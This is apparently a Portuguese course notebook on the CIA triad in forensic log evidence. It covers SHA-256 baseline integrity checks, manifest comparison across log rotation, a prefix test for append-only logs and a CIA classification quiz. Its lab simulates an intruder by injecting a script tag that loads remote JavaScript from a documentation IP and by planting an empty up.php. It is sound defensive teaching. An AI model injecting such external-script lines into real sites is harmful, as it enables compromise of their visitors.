# 🕵️ Dia 14 — A tríade CID como aparece na evidência

**Investigador Cyber 90 Dias** · Fase 1 · Rank Jutsu `D`

> Baseado no *Day 14* de [cyber-investigator-skills](https://github.com/thiefdroppers/cyber-investigator-skills/blob/main/curriculum/phase-1-foundations/day-14.md), © ThiefDroppers (MIT).
> Notebook, camada BR e Camada 8 por Deivison Lourenço ([@Ridd1kulusC0d3r](https://github.com/Ridd1kulusC0d3r)).

---

### 🎬 Onde paramos

Terça, 10h30. Você confere a segunda entrega de logs com o manifesto da primeira: quatro `FAILED`. A mensagem "os logs foram adulterados" já está meio escrita.

Rafa: *"Que horas roda o logrotate lá? Integridade é sobre conteúdo. Me mostra qual arquivo de ontem existe hoje com outro nome."*

Neste notebook você vai:

1. **Refazer a Parte 1 em Python**: linha de base, alterado, adicionado, removido.
2. **Comparar os dois manifestos da Serra Azul** por nome e por conteúdo, e testar crescimento de log por prefixo.
3. **Jogar o classificador CID** com os 11 cenários da matriz.
4. **Exportar a matriz** em CSV.

🐍 Só biblioteca padrão do Python. Nada para instalar. Rode as células de cima para baixo (Shift+Enter). Tudo funciona **sem internet**; quando uma célula tenta a rede, ela tem plano B embutido.

## 1. Monitoramento de integridade, em Python

As três checagens do AIDE/Wazuh, sobre uma pasta criada aqui mesmo: **alterado** (hash mudou), **adicionado** (só existe agora), **removido** (só existia antes).

In [ ]:
import hashlib
from pathlib import Path

def sha256(p):
    """Hash de um arquivo lido em bytes (o mesmo que sha256sum)."""
    return hashlib.sha256(Path(p).read_bytes()).hexdigest()

def linha_de_base(pasta):
    """= find pasta -type f -exec sha256sum {} + | sort -k2"""
    return {str(p): sha256(p) for p in sorted(Path(pasta).rglob("*")) if p.is_file()}

# Monta o laboratório do original
web = Path("lab-web"); web.mkdir(exist_ok=True)
(web / "index.html").write_text("<h1>Lab</h1>\n")
(web / "site.css").write_text("body{}\n")
base = linha_de_base(web)
for caminho, h in base.items():
    print(h, caminho)

# O "invasor" age
with open(web / "index.html", "a") as f:
    f.write('<script src="//203.0.113.9/x.js"></script>\n')
(web / "up.php").write_text("<?php\n")

agora = linha_de_base(web)
print()
for caminho, h in base.items():                           # = sha256sum -c baseline.sha256
    if caminho in agora:
        print(f"{caminho}: {'OK' if agora[caminho] == h else 'FAILED'}")
print("Adicionados (comm -13):", sorted(set(agora) - set(base)))
print("Removidos   (comm -23):", sorted(set(base) - set(agora)))

> 💡 O `sha256sum -c` só olha o que está **na lista**. O `up.php` só aparece quando você compara as **listas**. É a mesma razão pela qual, na seção 2, você vai comparar os manifestos de duas formas.

## 2. ➕ Os dois manifestos da Serra Azul

[`entrega-1-05out.sha256`](https://github.com/Ridd1kulusC0d3r/investigador-cyber-90-dias/blob/main/caso-continuo/dados/dia-14/entrega-1-05out.sha256) (5/out, 16h BRT) e [`entrega-2-06out.sha256`](https://github.com/Ridd1kulusC0d3r/investigador-cyber-90-dias/blob/main/caso-continuo/dados/dia-14/entrega-2-06out.sha256) (6/out, 10h BRT). Entre os dois, o `logrotate` rodou à meia-noite BRT.

In [ ]:
# ------------------------------------------------------------
# Carrega o arquivo do caso: primeiro tenta o repositório no GitHub,
# depois cai na cópia embutida (offline-first: o notebook nunca trava).
# ------------------------------------------------------------
import urllib.request                      # cliente HTTP da biblioteca padrão

URL = "https://raw.githubusercontent.com/Ridd1kulusC0d3r/investigador-cyber-90-dias/main/caso-continuo/dados/dia-14/entrega-1-05out.sha256"
EMBUTIDO = '541e2bf099a07eab89bead384f450a1b03af8e6d2fe927413c004111a65868ab  entrega/access.log\nb4629ab23260c9a2ac0b19afadc4bed90488d20c0cc4c8b47388314b5b15a301  entrega/access.log.1\nd532bafd1bea0c215efd5627b28c9a8ae316fd86088e459d42dff77eb8b29d31  entrega/auth.log\nf10c517ddb54f077b5e465955fc538f4f3a340d0524937f45e80518125c026e1  entrega/error.log\n'

try:
    with urllib.request.urlopen(URL, timeout=8) as resp:   # timeout curto: sem rede, desiste logo
        MANIFESTO_1 = resp.read().decode("utf-8")
    origem = "GitHub"
except Exception as erro:                  # sem internet, repo privado, URL mudou...
    MANIFESTO_1 = EMBUTIDO                   # ...plano B: a cópia que veio dentro do notebook
    origem = f"cópia embutida ({type(erro).__name__})"

print(f"Carregado de: {origem} — {len(MANIFESTO_1.splitlines())} linhas")

In [ ]:
# ------------------------------------------------------------
# Carrega o arquivo do caso: primeiro tenta o repositório no GitHub,
# depois cai na cópia embutida (offline-first: o notebook nunca trava).
# ------------------------------------------------------------
import urllib.request                      # cliente HTTP da biblioteca padrão

URL = "https://raw.githubusercontent.com/Ridd1kulusC0d3r/investigador-cyber-90-dias/main/caso-continuo/dados/dia-14/entrega-2-06out.sha256"
EMBUTIDO = 'd61d6c9b4c7b52bade729d3027e7f56fe48df20e239b5423fe55afb91ca15b87  entrega/access.log\nc34e24f4b6cc8deb46d5263346bbb758738340a761a84d972864b2f9800903e3  entrega/access.log.1\ne0a35cb4a39a2fddf2299e8e80e32be852907df653ce3a5e3c77d2c0441b37cc  entrega/access.log.2.gz\n018a39a12b422a3cdd1a4dc2276a1bcf221587a33acaf9f0d0479f96c832a80c  entrega/auth.log\n75572b28c7444bacd7e93736cff35c174592599171c60216f88b9fdd43748fa4  entrega/error.log\nf10c517ddb54f077b5e465955fc538f4f3a340d0524937f45e80518125c026e1  entrega/error.log.1\n'

try:
    with urllib.request.urlopen(URL, timeout=8) as resp:   # timeout curto: sem rede, desiste logo
        MANIFESTO_2 = resp.read().decode("utf-8")
    origem = "GitHub"
except Exception as erro:                  # sem internet, repo privado, URL mudou...
    MANIFESTO_2 = EMBUTIDO                   # ...plano B: a cópia que veio dentro do notebook
    origem = f"cópia embutida ({type(erro).__name__})"

print(f"Carregado de: {origem} — {len(MANIFESTO_2.splitlines())} linhas")

In [ ]:
def ler_manifesto(texto):
    """Linha 'hash  caminho' -> dicionário {caminho: hash}."""
    d = {}
    for linha in texto.strip().splitlines():
        h, caminho = linha.split(maxsplit=1)
        d[caminho] = h
    return d

e1, e2 = ler_manifesto(MANIFESTO_1), ler_manifesto(MANIFESTO_2)

print("── Comparação 1: POR NOME (o que o sha256sum -c faria) ──")
for nome, h in e1.items():
    estado = "OK" if e2.get(nome) == h else ("FAILED" if nome in e2 else "SUMIU")
    print(f"  {nome}: {estado}")

print("\n── Comparação 2: POR CONTEÚDO (o join da Prática BR) ──")
hash_para_nome_2 = {h: n for n, h in e2.items()}           # inverte: hash -> nome hoje
for nome, h in e1.items():
    if h in hash_para_nome_2:
        print(f"  {nome} de ontem == {hash_para_nome_2[h]} de hoje (mesmo conteúdo, outro nome)")

print("\n── Comparação 3: AS LISTAS ──")
print("  Só na entrega 1:", sorted(set(e1) - set(e2)) or "nenhum")
print("  Só na entrega 2:", sorted(set(e2) - set(e1)))

### O teste de prefixo: "cresceu ou foi editado?"

Os manifestos não bastam para `access.log` e `auth.log`: o hash mudou porque o arquivo **cresceu**. Para provar que nada do que já existia foi mudado, a versão de ontem tem que ser o **começo exato** da de hoje. A célula abaixo monta dois pares de exemplo (um honesto, um editado) e aplica o teste.

In [ ]:
import os

def cresceu_sem_edicao(antigo, novo):
    """True se o arquivo antigo é prefixo exato do novo (log append-only)."""
    n = os.path.getsize(antigo)                              # quantos bytes tinha ontem
    with open(antigo, "rb") as a, open(novo, "rb") as b:
        return hashlib.sha256(a.read()).digest() == hashlib.sha256(b.read(n)).digest()

Path("par").mkdir(exist_ok=True)
ontem = '198.51.100.31 - - [05/Oct/2026:09:02:44 -0300] "GET / HTTP/1.1" 200 18422 "-" "Mozilla/5.0"\n'
Path("par/access.log-ontem").write_text(ontem)
Path("par/access.log.1-honesto").write_text(ontem + '198.51.100.66 - - [05/Oct/2026:23:10:00 -0300] "GET / HTTP/1.1" 200 18422 "-" "Mozilla/5.0"\n')
Path("par/access.log.1-editado").write_text(ontem.replace("198.51.100.31", "198.51.100.32") + "linha nova\n")

for nome in ("honesto", "editado"):
    r = cresceu_sem_edicao("par/access.log-ontem", f"par/access.log.1-{nome}")
    print(f"{nome:<8} -> {'cresceu sem editar o passado' if r else 'o começo NÃO bate: pergunte ao TI (copytruncate? edição?)'}")

## 3. 🎮 O classificador CID

Os 8 cenários do original e os 3 da Operação Isca. Para cada um, digite as letras das propriedades violadas, sem espaço, em qualquer ordem: `C`, `I`, `D` (ex.: `CI`). O gabarito aceita a combinação do original. `MODO_JOGO = False` mostra só as respostas.

In [ ]:
MODO_JOGO = True

CENARIOS = [
    ("Regra criada às 03:12 encaminha mensagens com 'invoice' para webmail externo", "CI",
     "Mailbox audit: evento de criação da regra (IP, parâmetros) + sign-in da mesma sessão",
     "Quais mensagens foram de fato lidas; quem estava ao teclado"),
    ("Faixa 'hacked by' na página inicial do site", "I",
     "Hash da página vs. linha de base; ctime; log de acesso na hora da escrita",
     "Como o invasor obteve acesso de escrita"),
    ("Sistema de reservas com 503 por seis horas num feriado", "D",
     "Logs de erro da aplicação, métricas de recurso, eventos 7034",
     "Se foi ataque ou falha (sem tráfego anômalo, não dá para dizer)"),
    ("Pasta de documentos de identidade com link público por três semanas", "C",
     "Log de auditoria do compartilhamento (quem ligou, quando) e de downloads anônimos",
     "Quem baixou, se o download anônimo não era registrado"),
    ("Conta bancária do fornecedor diferente entre a fatura recebida e a enviada", "CI",
     "Cabeçalhos do e-mail, logs da caixa postal do fornecedor e do recebedor",
     "Em qual ponto do trajeto o PDF foi trocado"),
    ("Evento 1102 seguido de quase nenhuma entrada antiga no log de Segurança", "I",
     "Evento 1102 (conta que limpou, hora); cópia do log fora do host, se existir",
     "O que estava nas entradas apagadas"),
    ("Login de deploy (Dia 12) seguido de sudo cat /etc/shadow", "C",
     "auth.log: Accepted password + linha do sudo com o comando completo (+ autenticidade)",
     "Se os hashes saíram do servidor"),
    ("Arquivos renomeados com extensão nova e nota de resgate em cada pasta", "CD",
     "Logs de processo, eventos de criação de arquivo, tráfego de saída anterior",
     "Se houve exfiltração antes da cifragem, sem logs de saída"),
    ("➕ Cooperados digitaram usuário e senha em serraazul-pix.example", "C",
     "Relatos das vítimas + hotlinks do Dia 11; o registro do que foi digitado está no servidor do golpista",
     "Quais e quantas credenciais foram de fato capturadas"),
    ("➕ Três cooperados com Pix que não fizeram", "CI",
     "Logs de autenticação do internet banking (IP, dispositivo) e da transação (+ autenticidade)",
     "Quem estava fisicamente operando a sessão"),
    ("➕ Portal real devolveu 503 às 09:15 BRT e voltou em 6 s (Dia 11)", "D",
     "Log de erro do nginx na hora; contagem de requisições no minuto anterior",
     "Que tenha sido ataque: não houve pico de tráfego no log"),
]

acertos = 0
for i, (cenario, certo, registro, nao_prova) in enumerate(CENARIOS, start=1):
    print(f"\n[{i:02d}/{len(CENARIOS)}] {cenario}")
    if MODO_JOGO:
        r = input("   Propriedades (C, I, D): ").strip().upper()
        resposta = "".join(sorted(set(c for c in r if c in "CID")))   # normaliza: 'ic' -> 'CI'
        ok = resposta == "".join(sorted(certo))
        acertos += ok
        print("   ✅" if ok else f"   ❌ Gabarito: {certo}")
    print(f"   Registro: {registro}")
    print(f"   Não prova: {nao_prova}")
if MODO_JOGO:
    print(f"\n🏁 {acertos}/{len(CENARIOS)}", "— Checkpoint BR cumprido." if acertos >= 9 else "— Meta: 9.")

> 🧠 **Camada 8:** nos cenários de várias etapas (1, 5, 8, 10), a primeira letra que vem à cabeça costuma ser a da etapa mais **visível** (a nota de resgate, a fatura trocada). A etapa silenciosa (a cópia para fora, a leitura da caixa postal) é a que some do relatório.

## 4. 📝 A matriz em CSV

In [ ]:
#@title Exportar a matriz CID { display-mode: "form" }
nome_arquivo = "day14-cia-matrix.csv"  #@param {type:"string"}
conclusao_manifestos = "Com os manifestos, nenhuma violação de integridade foi demonstrada: error.log virou error.log.1 (mesmo hash); access.log, access.log.1 e auth.log mudaram de hash por rotação/crescimento/compactação e ainda dependem do teste de prefixo nos arquivos."  #@param {type:"string"}

import csv
Path("notas").mkdir(exist_ok=True)
with open(f"notas/{nome_arquivo}", "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f)
    w.writerow(["Cenário", "Propriedade (C/I/D)", "Registro ou campo específico", "Não consegue provar"])
    for cenario, certo, registro, nao_prova in CENARIOS:
        w.writerow([cenario.replace("➕ ", ""), "+".join(certo), registro, nao_prova])

Path("notas/isca-dia14-integridade.md").write_text(
    "# Integridade das entregas de log — Serra Azul (Dia 14)\n\n" + conclusao_manifestos + "\n", encoding="utf-8")
print(Path(f"notas/{nome_arquivo}").read_text(encoding="utf-8"))
try:
    from google.colab import files
    files.download(f"notas/{nome_arquivo}")
    files.download("notas/isca-dia14-integridade.md")
except ImportError:
    print("(Fora do Colab: os arquivos ficaram em notas/)")

## ✅ Antes de fechar o Dia 14

- [ ] Classificador com pelo menos 9/11
- [ ] `notas/isca-dia14-integridade.md` sem afirmar violação
- [ ] `day14-integrity-report.md` e a `day14-cia-matrix` com as 11 linhas (README, Partes 1 a 3)
- [ ] `status` do dia 14 = `estudado` no `curriculo/mapa-dos-dias.csv`

**Amanhã (Dia 15):** vetores de ataque e a evidência que cada um deixa. Como o golpe "entrou" na Serra Azul, se ninguém invadiu nada?

---
<sub>Baseado em cyber-investigator-skills por ThiefDroppers (MIT) · Investigador Cyber 90 Dias por Deivison Lourenço</sub>